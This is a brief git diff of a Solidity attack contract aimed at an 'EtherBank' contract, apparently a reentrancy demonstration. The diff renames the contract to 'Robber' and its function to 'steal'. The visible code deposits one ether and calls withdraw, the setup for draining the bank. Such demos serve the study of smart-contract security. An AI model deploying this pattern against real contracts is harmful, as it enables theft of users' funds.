@@ -3,7 +3,7 @@ pragma solidity 0.8.22;
 
 import "./EtherBank.sol";
 
-contract Attack {
+contract Robber {
     EtherBank public etherBank;
     uint256 public constant AMOUNT = 1 ether;
 
@@ -17,7 +17,7 @@ contract Attack {
         }
     }
 
-    function rob() external payable {
+    function steal() external payable {
         require(msg.value > AMOUNT);
         etherBank.deposit{value: AMOUNT}();
         etherBank.withdraw();
